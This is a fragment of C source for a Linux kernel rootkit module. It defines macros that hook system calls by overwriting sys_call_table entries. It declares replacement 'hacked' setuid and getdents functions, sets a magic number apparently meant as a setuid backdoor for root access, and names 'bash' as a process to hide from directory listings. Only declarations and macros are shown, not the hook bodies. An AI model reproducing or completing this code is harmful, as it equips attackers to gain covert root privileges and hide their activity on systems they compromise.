#include <linux/err.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/proc_fs.h>
#include <asm/uaccess.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/utsname.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/slab.h>
#include <linux/proc_ns.h>

struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[1];
};

//macros
#define BAIL_ON_ERROR(iError)                                                 \
    if (iError) {                                                             \
        printk(KERN_ERR "ERROR [%d]- %s:%s, line %d \n",                      \
                iError,__FILE__,__FUNCTION__,__LINE__);                       \
        goto error;                                                           \
    }

#define DEBUG(msg)                                                           \
    printk(KERN_DEBUG "DEBUG [%s:%s at %d]: %s\n",         \
            __FILE__,__FUNCTION__,__LINE__, msg)

#define MAGIC_NUMBER 12345

#define HOOK_SYSCALL(sys_call_table, orig_func, hacked_func, __NR_index)    \
    orig_func = (void *)sys_call_table[__NR_index];                        \
    sys_call_table[__NR_index] = (unsigned long*)&hacked_func

#define UNHOOK_SYSCALL(sys_call_table, orig_func, __NR_index)               \
    sys_call_table[__NR_index] = (unsigned long*)orig_func

// Original system calls
asmlinkage long (*orig_setuid)(uid_t uid);
asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

// Hacked system calls
asmlinkage long hacked_setuid(uid_t uid);
asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

char *HIDDEN_PROCESS = "bash";